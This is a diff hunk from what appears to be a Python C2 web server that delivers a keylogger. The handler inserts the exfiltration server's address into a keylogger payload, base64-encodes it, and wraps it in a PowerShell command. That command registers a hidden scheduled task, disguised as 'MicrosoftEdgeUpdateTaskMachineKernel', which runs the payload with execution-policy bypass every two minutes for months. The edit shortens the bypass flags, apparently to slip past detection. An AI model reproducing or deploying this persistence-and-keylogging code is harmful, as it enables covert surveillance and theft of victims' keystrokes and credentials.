@@ -122,7 +122,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 klogger_full_payload = klogger_full_payload.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                 klogger_full_payload = klogger_full_payload.replace('SERVER_PROTOCOL',PROTOCOL)
                 klogger_full_payload_encoded = encode_to_base64_utf16_le(klogger_full_payload)
-                klogger_full_TASK = '$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -windowstyle hidden -e BASE64_ENCODED_PAYLOAD_UTF16LE";$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(60) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Hours 4380);$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings (New-ScheduledTaskSettingsSet);Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineKernel" -InputObject $Task -Force;'
+                klogger_full_TASK = '$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep b -nop -windowstyle hidden -e BASE64_ENCODED_PAYLOAD_UTF16LE";$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(60) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Hours 4380);$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings (New-ScheduledTaskSettingsSet);Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineKernel" -InputObject $Task -Force;'
                 klogger_full_TASK = klogger_full_TASK.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',klogger_full_payload_encoded.decode('utf-8'))
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
